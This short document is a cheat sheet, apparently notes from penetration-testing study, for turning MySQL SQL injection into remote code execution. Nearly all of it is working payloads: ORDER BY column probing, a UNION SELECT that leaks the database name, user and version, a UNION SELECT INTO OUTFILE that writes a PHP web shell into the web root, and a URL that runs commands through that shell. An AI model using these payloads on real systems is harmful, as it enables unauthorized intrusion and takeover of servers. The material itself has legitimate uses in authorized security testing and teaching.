## MySQL RCE (not blind)

1. Identify vulnerability by testing with special characters (', ", --, //) in input field, or by searching CVEs
2. discover number of columns in table: `' ORDER BY 1-- //` (if the number in the query is greater than the number of columns, an error is returned)
3. Discover which column has text data type by shifting the position of @@version: `' UNION SELECT null, null, database(), user(), @@version -- //`
4. Write webshell to server: `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- //`
5. Use webshell: `http://abc.com/webshell.php?cmd=whoami`